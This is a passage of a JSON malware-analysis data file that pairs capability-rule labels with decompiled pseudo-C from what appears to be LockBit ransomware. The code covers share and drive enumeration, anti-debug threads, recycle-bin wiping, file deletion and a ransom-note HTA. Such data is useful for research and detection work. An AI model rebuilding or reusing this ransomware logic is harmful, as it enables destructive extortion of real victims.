*(in_FS_OFFSET + 0x30);\n    puStack148 = &stack0xffffff80;\n    uStack152 = *(*(iVar4 + 0x10) + 0x18);\n    uStack156 = 0x40f8d3;\n    (*_sym.imp.KERNEL32.dll_GetConsoleMode)();\n    uStack156 = uStack136 & 0xffffffbf | 0x80;\n    uStack160 = *(*(iVar4 + 0x10) + 0x18);\n    uStack164 = 0x40f8ec;\n    (*_sym.imp.KERNEL32.dll_SetConsoleMode)();\n    pcVar1 = _sym.imp.USER32.dll_RegisterHotKey;\n    uStack164 = 0x70;\n    iStack168 = 4;\n    uStack172 = 1;\n    uStack176 = 0;\n    uStack180 = 0x40f8fc;\n    (*_sym.imp.USER32.dll_RegisterHotKey)();\n    uStack180 = 0x70;\n    iStack184 = 0;\n    iStack188 = 2;\n    uStack192 = 0;\n    (*pcVar1)();\n    iVar4 = (*_sym.imp.USER32.dll_GetMessageW)(&stack0xffffff64, 0, 0, 0);\n    pcVar1 = _sym.imp.USER32.dll_PeekMessageW;\n    do {\n        if (iVar4 == 0) {\n            return 0;\n        }\n        (*pcVar1)(&stack0xffffff54, 0, 0, 0, 0);\n        if (iStack188 == 0x312) {\n            if (iStack184 == 1) {\n                uVar6 = 5;\n            }\n            else {\n                if (iStack184 != 2) goto code_r0x0040f951;\n                uVar6 = 0;\n            }\n            (*pcVar2)(uVar3, uVar6);\n        }\ncode_r0x0040f951:\n        iVar4 = (*_sym.imp.USER32.dll_GetMessageW)(&stack0xffffff40, 0, 0, 0);\n    } while( true );\n}\n",
        "token_count": 1495
    },
    "0040fbf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0040fbf0(uint param_1)\n\n{\n    int16_t iVar1;\n    int16_t *arg_ch;\n    int16_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint var_1ch;\n    uint DuplicateTokenHandle;\n    uint ExistingTokenHandle;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint size;\n    \n    size = 0x4000;\n    var_ch = 0xffffffff;\n    iVar3 = (*_sym.imp.MPR.dll_WNetOpenEnumW)(2, 0, 0x13, param_1, &var_10h);\n    if (iVar3 != 0) {\n        return false;\n    }\n    iVar3 = (*_sym.imp.msvcrt.dll_malloc)(size);\n    var_8h = iVar3;\n    if (iVar3 == 0) {\n        return false;\n    }\n    while( true ) {\n        fcn.004124f0(iVar3, 0, size);\n        iVar4 = (*_sym.imp.MPR.dll_WNetEnumResourceW)(var_10h, &var_ch, iVar3, &size);\n        if (iVar4 != 0) break;\n        uVar7 = 0;\n        iVar4 = iVar3;\n        if (var_ch != 0) {\n            do {\n                if ((*(iVar4 + 0xc) & 2) != 0) {\n                    fcn.0040fbf0();\n                }\n                if ((*(iVar3 + 4) != 2) &&\n                   (puVar5 = (*_sym.imp.msvcrt.dll_malloc)(0x404),  iVar3 = var_8h,  puVar5 != NULL)) {\n                    iVar3 = 0;\n                    arg_ch = *(var_8h + 0x14);\n                    if (arg_ch != NULL) {\n                        iVar1 = *arg_ch;\n                        piVar2 = arg_ch;\n                        while (iVar1 != 0) {\n                            piVar2 = piVar2 + 1;\n                            iVar3 = iVar3 + 1;\n                            iVar1 = *piVar2;\n                        }\n                    }\n                    fcn.004124d0(puVar5 + 1, arg_ch, iVar3 * 2 + 2);\n                    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenThreadToken)(0xfffffffe, 10, 1, &ExistingTokenHandle);\n                    if (iVar3 == 0) {\n                        uVar6 = 0xffffffff;\n                    }\n                    else {\n                        iVar3 = (*_sym.imp.ADVAPI32.dll_DuplicateToken)(ExistingTokenHandle, 2, &DuplicateTokenHandle);\n                        uVar6 = 0xffffffff;\n                        if (iVar3 != 0) {\n                            uVar6 = DuplicateTokenHandle;\n                        }\n                    }\n                    *puVar5 = uVar6;\n                    iVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040fd80, puVar5, 0, &var_1ch);\n                    if (iVar3 != -1) {\n                        (*_sym.imp.ntdll.dll_NtSetInformationThread)(iVar3, 0x11, 0, 0);\n                    }\n                    *(*0x428408 * 4 + 0x426960) = iVar3;\n                    LOCK();\n                    *0x428408 = *0x428408 + 1;\n                    iVar3 = var_8h;\n                }\n                uVar7 = uVar7 + 1;\n                iVar4 = iVar4 + 0x20;\n            } while (uVar7 < var_ch);\n        }\n    }\n    (*_sym.imp.msvcrt.dll_free)(iVar3);\n    iVar3 = (*_sym.imp.MPR.dll_WNetCloseEnum)(var_10h);\n    return iVar3 == 0;\n}\n",
        "token_count": 874
    },
    "0040fe80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040fe80(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint arglist;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int16_t var_2ch;\n    int16_t var_2ah;\n    ushort var_28h;\n    uint var_25h;\n    uchar var_21h;\n    uchar var_20h;\n    uchar var_1fh;\n    uchar var_1eh;\n    uchar var_1dh;\n    uint32_t lpRootPathName;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.ntdll.dll_RtlInitializeCriticalSection)(0x426930);\n    pcVar2 = _sym.imp.KERNEL32.dll_CreateThread;\n    iVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0041a450, 0, 0, &var_8h);\n    pcVar3 = _sym.imp.ntdll.dll_NtSetInformationThread;\n    if (iVar4 != -1) {\n        (*_sym.imp.ntdll.dll_NtSetInformationThread)(iVar4, 0x11, 0, 0);\n    }\n    *(*0x428408 * 4 + 0x426960) = iVar4;\n    LOCK();\n    *0x428408 = *0x428408 + 1;\n    iVar4 = (*pcVar2)(0, 0, 0x40fab0, 0, 0, &var_ch);\n    if (iVar4 != -1) {\n        (*pcVar3)(iVar4, 0x11, 0, 0);\n    }\n    *(*0x428408 * 4 + 0x426960) = iVar4;\n    LOCK();\n    *0x428408 = *0x428408 + 1;\n    iVar4 = (*pcVar2)(0, 0, 0x40fa70, 0, 0, &var_10h);\n    if (iVar4 != -1) {\n        (*pcVar3)(iVar4, 0x11, 0, 0);\n    }\n    *(*0x428408 * 4 + 0x426960) = iVar4;\n    LOCK();\n    *0x428408 = *0x428408 + 1;\n    var_4h = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    uVar5 = 0x1a;\n    lpRootPathName = *0x41d9cc;\n    var_18h._0_2_ = *0x41d9d0;\n    do {\n        uVar5 = uVar5 - 1;\n        if ((*(&var_4h + (uVar5 >> 3)) >> (uVar5 & 7) & 1) == 0) {\ncode_r0x00410081:\n            lpRootPathName = lpRootPathName & 0xffff0000 | lpRootPathName - 1;\n        }\n        else {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(&lpRootPathName);\n            if (((iVar4 != 3) && (iVar4 != 2)) && (iVar4 != 6)) goto code_r0x00410081;\n            iVar4 = (*_sym.imp.msvcrt.dll_malloc)(10);\n            if (iVar4 != 0) {\n                var_38h = 0x25001c;\n                var_34h = 0x5c0073;\n                var_30h._0_2_ = 0;\n                var_30h._2_2_ = str.threads_closed__waiting_handles...._0_4_;\n                var_2ch = str.threads_closed__waiting_handles...._0_4_ >> 0x10;\n                var_2ah = str.threads_closed__waiting_handles...._4_4_;\n                var_28h = 0;\n                (*_sym.imp.USER32.dll_wsprintfW)(iVar4, &var_38h + 2, &lpRootPathName);\n                iVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00410170, iVar4, 0, &var_14h);\n                if (iVar4 != -1) {\n                    (*pcVar3)(iVar4, 0x11, 0, 0);\n                }\n                *(*0x428408 * 4 + 0x426960) = iVar4;\n                LOCK();\n                *0x428408 = *0x428408 + 1;\n                goto code_r0x00410081;\n            }\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n        if (uVar5 == 0) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(15000);\n            iVar4 = *0x428408;\n            (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(*0x428408, 0x426960, 0, 0xffffffff);\n            uVar5 = 0;\n            var_5ch = *0x423d00;\n            uStack92 = *0x423d04;\n            uStack88 = *0x423d08;\n            uStack84 = *0x423d0c;\n            var_3ch = 0x333333;\n            var_4ch = *0x423ea0;\n            uStack76 = *0x423ea4;\n            uStack72 = *0x423ea8;\n            uStack68 = *0x423eac;\n            do {\n                var_5ch._0_1_ = *0x423d00;\n                puVar1 = &var_5ch + uVar5 + 1;\n                *puVar1 = *puVar1 ^ var_5ch;\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < 0x22);\n            var_3ch = var_3ch & 0xffffff;\n            fcn.0040f630(&var_5ch + 1, iVar4);\n            do {\n                do {\n                    (*pcVar2)(100);\n                } while (*0x428420 != 0);\n            } while (*0x426110 != 0);\n            arglist = 0x426930;\n            (*_sym.imp.ntdll.dll_RtlDeleteCriticalSection)();\n            var_25h._0_1_ = 7;\n            var_1dh = 0;\n            var_25h._1_1_ = 0x43;\n            var_20h = 0x6e;\n            var_25h._2_1_ = 0x6c;\n            var_25h._3_1_ = 0x65;\n            var_1fh = 0x75;\n            var_21h = 0x61;\n            var_1eh = 0x70;\n            fcn.0040f630(&var_25h + 1, arglist);\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 1672
    },
    "00410170": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410170(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint extraout_ECX;\n    code *pcVar8;\n    int32_t in_FS_OFFSET;\n    int16_t *piVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uStack2468;\n    uint uStack2464;\n    uint uStack2460;\n    int16_t iStack2456;\n    int16_t iStack2454;\n    int16_t iStack2452;\n    uint uStack2450;\n    uint uStack2446;\n    uint uStack2442;\n    ushort uStack2438;\n    uint16_t uStack2436;\n    uint16_t uStack2434;\n    uint16_t uStack2432;\n    uint16_t uStack2430;\n    uint16_t uStack2428;\n    ushort uStack2426;\n    uchar auStack2368 [32];\n    uchar auStack2336 [104];\n    uchar auStack2232 [64];\n    uchar auStack2168 [416];\n    uchar auStack1752 [44];\n    uchar auStack1708 [576];\n    uchar auStack1132 [528];\n    uchar auStack604 [600];\n    \n    LOCK();\n    *0x426110 = *0x426110 + 1;\n    uVar12 = 0x426930;\n    (*_sym.imp.ntdll.dll_RtlEnterCriticalSection)(0x426930);\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrcmpiW;\n    pcVar8 = NULL;\n    if (0 < *0x428404) {\n        do {\n            iVar3 = (*pcVar2)(*(pcVar8 * 4 + 0x426120), arg_8h);\n            if (iVar3 == 0) goto code_r0x004102d6;\n            pcVar8 = pcVar8 + 1;\n        } while (pcVar8 < *0x428404);\n    }\n    pcVar8 = _sym.imp.USER32.dll_wsprintfW;\n    uStack2468 = 0x250023;\n    uStack2464 = 0x5c0073;\n    uStack2460 = 0x2a;\n    iStack2456 = *0x41d9a6;\n    iStack2454 = str._s_S._0_4_;\n    iStack2452 = str._s_S._0_4_ >> 0x10;\n    uStack2450 = str._s_S._4_4_;\n    (*_sym.imp.USER32.dll_wsprintfW)(auStack1132, &uStack2468 + 2, arg_8h);\n    iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileExW)(auStack1132, 0, auStack604, 0, 0, 0);\n    if (iVar3 == -1) {\ncode_r0x004102d6:\n        LOCK();\n        *0x426110 = *0x426110 + -1;\n        (*_sym.imp.ntdll.dll_RtlLeaveCriticalSection)(0x426930);\n        iVar3 = (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n    uStack2450 = 0x150030;\n    uStack2436 = str._S__s_total____s_free._0_4_ ^ 0x30;\n    uStack2446 = 0x6c0043;\n    uStack2434 = str._S__s_total____s_free._0_4_ >> 0x10 ^ 0x30;\n    uStack2442 = 0x630015;\n    uStack2432 = str._S__s_total____s_free._4_4_ ^ 0x30;\n    uStack2438 = 0x30;\n    uStack2430 = str._S__s_total____s_free._4_4_ >> 0x10 ^ 0x30;\n    uStack2428 = str._S__s_total____s_free._8_4_ ^ 0x30;\n    uVar6 = 0;\n    do {\n        *(&uStack2450 + uVar6 * 2 + 2) = *(&uStack2450 + uVar6 * 2 + 2) ^ 0x30;\n        uVar6 = uVar6 + 1;\n    } while (uVar6 < 0xb);\n    uStack2426 = 0;\n    (*pcVar8)(auStack2168, &uStack2450 + 2, arg_8h, 0x426920);\n    uVar11 = 0;\n    uVar10 = 0x4000100;\n    iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(auStack2168, 0xc0000000, 0, 0, 1, 0x4000100, 0);\n    if ((iVar4 == -1) && (*(in_FS_OFFSET + 0x34) == 0xb7)) {\n        LOCK();\n        *0x426110 = *0x426110 + -1;\n        (*_sym.imp.ntdll.dll_RtlLeaveCriticalSection)(0x426930);\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    uVar5 = (*_sym.imp.msvcrt.dll_malloc)(0x410);\n    *(*0x428404 * 4 + 0x426120) = uVar5;\n    fcn.004124f0(uVar5, 0, 0x410);\n    iVar7 = 0;\n    if (arg_8h != NULL) {\n        iVar1 = *arg_8h;\n        piVar9 = arg_8h;\n        while (iVar1 != 0) {\n            piVar9 = piVar9 + 1;\n            iVar7 = iVar7 + 1;\n            iVar1 = *piVar9;\n        }\n    }\n    fcn.004124d0(*(*0x428404 * 4 + 0x426120), arg_8h, iVar7 * 2 + 2);\n    *0x428404 = *0x428404 + 1;\n    uVar5 = 0x426930;\n    (*_sym.imp.ntdll.dll_RtlLeaveCriticalSection)(0x426930);\n    (*_sym.imp.SHELL32.dll_SHEmptyRecycleBinW)(0, arg_8h, 7);\n    piVar9 = arg_8h;\n    iVar7 = (*_sym.imp.KERNEL32.dll_GetDiskFreeSpaceExW)(arg_8h, &iStack2452, &uStack2468, &uStack2460);\n    if (iVar7 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetThreadUILanguage)(0x409);\n        pcVar2 = _sym.imp.SHLWAPI.dll_StrFormatByteSize64A;\n        (*_sym.imp.SHLWAPI.dll_StrFormatByteSize64A)(iVar3, uVar12, auStack2336, 100);\n        (*pcVar2)(uVar10, uVar11, &iStack2456, 100);\n        fcn.00401080(extraout_ECX, uVar5, arg_8h, auStack2368, &stack0xfffff658);\n        uVar12 = fcn.00401040();\n        (*_sym.imp.USER32.dll_wsprintfA)(auStack1752, uVar12);\n        fcn.0040f630(auStack1708, piVar9);\n    }\n    fcn.00410530();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    (*_sym.imp.KERNEL32.dll_DeleteFileW)(auStack2232);\n    LOCK();\n    *0x426110 = *0x426110 + -1;\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1804
    },
    "00411a30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411a30(uint param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint var_86h;\n    uint var_4h;\n    \n    fcn.00401a90(param_1);\n    pcVar2 = fcn.00401480();\n    iVar3 = 0;\n    if (pcVar2 != NULL) {\n        cVar1 = *pcVar2;\n        while (cVar1 != '\\0') {\n            iVar3 = iVar3 + 1;\n            cVar1 = pcVar2[iVar3];\n        }\n    }\n    fcn.00411e40();\n    return;\n}\n",
        "token_count": 152
    },
    "00411a80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00411a80(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint extraout_ECX;\n    int32_t iVar6;\n    ulong uVar7;\n    uint ARG_0;\n    uint var_6eh;\n    uint lpNumberOfBytesWritten;\n    uint var_16h;\n    uint var_12h;\n    uint var_eh;\n    uint var_ah;\n    uint16_t var_6h;\n    uint16_t var_4h;\n    ushort var_2h;\n    \n    iVar3 = 0;\n    do {\n        iVar1 = iVar3;\n        iVar3 = iVar1 + 1;\n    } while (\"<html><head><meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"><meta http-equiv=\\\"x-ua-compatible\\\" content=\\\"ie=9\\\"><title>LockBit</title><hta:application id=LockBit applicationName=LockBit icon=explorer.exe selection=no scroll=no contextmenu=no innerBorder=no windowState=maximize minimizeButton=no singleInstance=yes sysMenu=no /><link rel=\\\"stylesheet\\\" href=\\\"public/css/test.css\\\"><meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"><style>html{font-size:100%}body{position:relative;border:0;font-family:Arial;padding:1% 0 0 0;margin:0;width:100vw;height:100vh;overflow:hidden}*{font-size:1rem}.g1{content:\\\"\\\";position:absolute;left:0;top:50%;transform:translateY(-50%);height:368px;width:150px;z-index:-1}.g2{z-index:-1;content:\\\"\\\";position:absolute;right:0;top:50%;transform:translateY(-50%);height:368px;width:150px}.container{width:90%;margin:auto}.container img{max-width:100%}.ht{margin-bottom:1%;position:relative;padding-left:16px;font-weight:900;font-size:1rem;line-height:100%;letter-spacing:.05em;text-transform:uppercase;color:#dedede}.hb{margin-bottom:1%}.hb img{width:850px;max-width:100%}.hi{margin-bottom:1rem;background:#fcfcfd;border:1px dashed #f71b3a;box-sizing:border-box;b\"\n             [iVar1 + 1] != '\\0');\n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)(iVar1 + 2);\n    iVar3 = 0;\n    do {\n        iVar2 = iVar3 + 1;\n        iVar6 = iVar3 + 1;\n        iVar3 = iVar2;\n    } while (\"<html><head><meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"><meta http-equiv=\\\"x-ua-compatible\\\" content=\\\"ie=9\\\"><title>LockBit</title><hta:application id=LockBit applicationName=LockBit icon=explorer.exe selection=no scroll=no contextmenu=no innerBorder=no windowState=maximize minimizeButton=no singleInstance=yes sysMenu=no /><link rel=\\\"stylesheet\\\" href=\\\"public/css/test.css\\\"><meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"><style>html{font-size:100%}body{position:relative;border:0;font-family:Arial;padding:1% 0 0 0;margin:0;width:100vw;height:100vh;overflow:hidden}*{font-size:1rem}.g1{content:\\\"\\\";position:absolute;left:0;top:50%;transform:translateY(-50%);height:368px;width:150px;z-index:-1}.g2{z-index:-1;content:\\\"\\\";position:absolute;right:0;top:50%;transform:translateY(-50%);height:368px;width:150px}.container{width:90%;margin:auto}.container img{max-width:100%}.ht{margin-bottom:1%;position:relative;padding-left:16px;font-weight:900;font-size:1rem;line-height:100%;letter-spacing:.05em;text-transform:uppercase;color:#dedede}.hb{margin-bottom:1%}.hb img{width:850px;max-width:100%}.hi{margin-bottom:1rem;background:#fcfcfd;border:1px dashed #f71b3a;box-sizing:border-box;b\"\n             [iVar6] != '\\0');\n    fcn.004124d0(iVar1, \n                 \"<html><head><meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"><meta http-equiv=\\\"x-ua-compatible\\\" content=\\\"ie=9\\\"><title>LockBit</title><hta:application id=LockBit applicationName=LockBit icon=explorer.exe selection=no scroll=no contextmenu=no innerBorder=no windowState=maximize minimizeButton=no singleInstance=yes sysMenu=no /><link rel=\\\"stylesheet\\\" href=\\\"public/css/test.css\\\"><meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"><style>html{font-size:100%}body{position:relative;border:0;font-family:Arial;padding:1% 0 0 0;margin:0;width:100vw;height:100vh;overflow:hidden}*{font-size:1rem}.g1{content:\\\"\\\";position:absolute;left:0;top:50%;transform:translateY(-50%);height:368px;width:150px;z-index:-1}.g2{z-index:-1;content:\\\"\\\";position:absolute;right:0;top:50%;transform:translateY(-50%);height:368px;width:150px}.container{width:90%;margin:auto}.container img{max-width:100%}.ht{margin-bottom:1%;position:relative;padding-left:16px;font-weight:900;font-size:1rem;line-height:100%;letter-spacing:.05em;text-transform:uppercase;color:#dedede}.hb{margin-bottom:1%}.hb img{width:850px;max-width:100%}.hi{margin-bottom:1rem;background:#fcfcfd;border:1px dashed #f71b3a;box-sizing:border-box;b\"\n                 , iVar2);\n    iVar6 = 0;\n    iVar3 = fcn.00412570();\n    if (0 < iVar3) {\n        do {\n            if ((((((*(iVar6 + iVar1) == '1') && (*(iVar6 + 1 + iVar1) == '2')) && (*(iVar6 + 2 + iVar1) == '3')) &&\n                 ((*(iVar6 + 3 + iVar1) == '4' && (*(iVar6 + 4 + iVar1) == '5')))) &&\n                ((*(iVar6 + 5 + iVar1) == '6' && ((*(iVar6 + 6 + iVar1) == '7' && (*(iVar6 + 7 + iVar1) == '8')))))) &&\n               ((*(iVar6 + 8 + iVar1) == '9' && ((*(iVar6 + 9 + iVar1) == '1' && (*(iVar6 + 10 + iVar1) == '1')))))) {\n                uVar7 = fcn.00412570();\n                iVar3 = uVar7 >> 0x20;\n                if (0 < uVar7) {\n                    do {\n                        *(iVar6 + iVar1 + iVar3) = *(iVar3 + 0x428230);\n                        uVar7 = fcn.00412570();\n                        iVar3 = uVar7 >> 0x20;\n                    } while (iVar3 < uVar7);\n                }\n            }\n            iVar6 = iVar6 + 1;\n            iVar3 = fcn.00412570();\n        } while (iVar6 < iVar3);\n    }\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0, 0, 0, &ARG_0);\n    fcn.00401940(extraout_ECX, lpNumberOfBytesWritten, &ARG_0);\n    uVar4 = fcn.004013b0();\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, uVar4);\n    iVar6 = (*_sym.imp.KERNEL32.dll_CreateFileW)(&ARG_0, 0x40000000, 0, 0, 2, 0x80, 0);\n    iVar3 = 0;\n    if (iVar6 != -1) {\n        do {\n            iVar5 = iVar3 + 1;\n            iVar2 = iVar3 + 1;\n            iVar3 = iVar5;\n        } while (\"<html><head><meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"><meta http-equiv=\\\"x-ua-compatible\\\" content=\\\"ie=9\\\"><title>LockBit</title><hta:application id=LockBit applicationName=LockBit icon=explorer.exe selection=no scroll=no contextmenu=no innerBorder=no windowState=maximize minimizeButton=no singleInstance=yes sysMenu=no /><link rel=\\\"stylesheet\\\" href=\\\"public/css/test.css\\\"><meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"><style>html{font-size:100%}body{position:relative;border:0;font-family:Arial;padding:1% 0 0 0;margin:0;width:100vw;height:100vh;overflow:hidden}*{font-size:1rem}.g1{content:\\\"\\\";position:absolute;left:0;top:50%;transform:translateY(-50%);height:368px;width:150px;z-index:-1}.g2{z-index:-1;content:\\\"\\\";position:absolute;right:0;top:50%;transform:translateY(-50%);height:368px;width:150px}.container{width:90%;margin:auto}.container img{max-width:100%}.ht{margin-bottom:1%;position:relative;padding-left:16px;font-weight:900;font-size:1rem;line-height:100%;letter-spacing:.05em;text-transform:uppercase;color:#dedede}.hb{margin-bottom:1%}.hb img{width:850px;max-width:100%}.hi{margin-bottom:1rem;background:#fcfcfd;border:1px dashed #f71b3a;box-sizing:border-box;b\"\n                 [iVar2] != '\\0');\n        iVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar6, iVar1, iVar5, &lpNumberOfBytesWritten, 0);\n        if (iVar3 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            return 0;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar6);\n        fcn.00411ca0();\n        var_ah._0_2_ = *0x42222e ^ 0x53;\n        var_16h = 0x3c0053;\n        var_ah._2_2_ = str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n                       ._0_4_ ^ 0x53;\n        var_12h = 0x360023;\n        var_6h = str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n                 ._0_4_ >> 0x10 ^ 0x53;\n        var_eh = 0x53003d;\n        var_4h = str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n                 ._4_4_ ^ 0x53;\n        var_2h = 0;\n        uVar4 = fcn.00401400(&ARG_0, 0, 0, 1);\n        (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, uVar4);\n        iVar3 = 1;\n    }\n    return iVar3;\n}\n",
        "token_count": 2623
    },
    "00411ca0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __fastcall fcn.00411ca0(uint param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    uint extraout_ECX;\n    int16_t *piVar7;\n    int16_t *piVar8;\n    bool bVar9;\n    uint lpString1;\n    uint var_eah;\n    uint var_4bh;\n    uint uStack75;\n    uint uStack71;\n    uint uStack67;\n    uint var_3bh;\n    uint uStack59;\n    uint uStack55;\n    uint uStack51;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint lpType;\n    int32_t TokenInformation;\n    int16_t *ReturnLength;\n    uint hKey;\n    int32_t TokenHandle;\n    uint var_1h;\n    \n    var_4bh = *0x423bf0;\n    uStack75 = *0x423bf4;\n    uStack71 = *0x423bf8;\n    uStack67 = *0x423bfc;\n    lpType = 1;\n    var_1h._0_1_ = 0;\n    var_3bh = *0x423c00;\n    uStack59 = *0x423c04;\n    uStack55 = *0x423c08;\n    uStack51 = *0x423c0c;\n    var_2bh = 0x391b010a;\n    var_27h = 0x61c1d0a;\n    var_23h = 0x3d330100;\n    var_1fh._0_2_ = 0x11a;\n    var_1fh._2_1_ = 0;\n    uVar2 = fcn.00401370();\n    TokenHandle = 0;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &TokenHandle);\n    iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n    iVar5 = 0;\n    if (iVar4 != 0) {\n        ReturnLength = 0x4;\n        iVar4 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n        if (iVar4 != 0) {\n            iVar5 = TokenInformation;\n        }\n    }\n    if (TokenHandle != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    iVar5 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                      (-0x7ffffffe - (iVar5 != 1), uVar2, 0, 0, 0, 0x2001f, 0, &hKey, &var_1fh + 3);\n    if (iVar5 != 0) {\n        return var_1h;\n    }\n    puVar6 = fcn.00401670(extraout_ECX, stack0xffffffe0);\n    iVar5 = 0x4d;\n    piVar8 = puVar6 + 2;\n    piVar7 = piVar8;\n    do {\n        *piVar7 = *puVar6 ^ *piVar7;\n        iVar5 = iVar5 + -1;\n        piVar7 = piVar7 + 1;\n    } while (iVar5 != 0);\n    *(puVar6 + 0x9c) = 0;\n    TokenInformation = 0x104;\n    ReturnLength = piVar8;\n    iVar5 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, piVar8, 0, &lpType, &lpString1, &TokenInformation);\n    if (iVar5 == 0) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(&lpString1, param_2);\n        bVar9 = iVar5 == 0;\n        piVar8 = ReturnLength;\n        if (bVar9) goto code_r0x00411e22;\n    }\n    iVar5 = 0;\n    if (param_2 != NULL) {\n        iVar1 